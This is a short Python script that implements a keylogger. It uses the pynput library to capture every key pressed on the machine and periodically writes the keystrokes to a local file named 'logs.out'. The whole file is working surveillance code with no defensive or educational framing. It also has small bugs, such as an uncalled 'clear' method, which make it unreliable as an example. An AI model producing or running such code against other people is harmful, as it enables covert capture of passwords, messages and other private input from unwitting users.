import _thread as thread
from pynput import keyboard
import sys

key_list = []
count = 0

def update_json_file(key_list):
    with open('logs.out', 'w') as key_strokes:
        key_strokes.write("".join(key_list))

def on_press(key):
    global key_list, count
    if key == keyboard.Key.space:
        key = " "
    if key == keyboard.Key.backspace:
        key = ""
    if key == keyboard.Key.enter:
        key = "\n"
    key_list.append(str(key).replace("'", ""))
    count+=1
    if count >= 10:
        thread.start_new_thread(update_json_file, (key_list,))
        key_list.clear
        count=0

def on_release(key):
    pass


try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as     listener:
        listener.join()
finally:
    update_json_file(key_list)
    sys.exit(1)
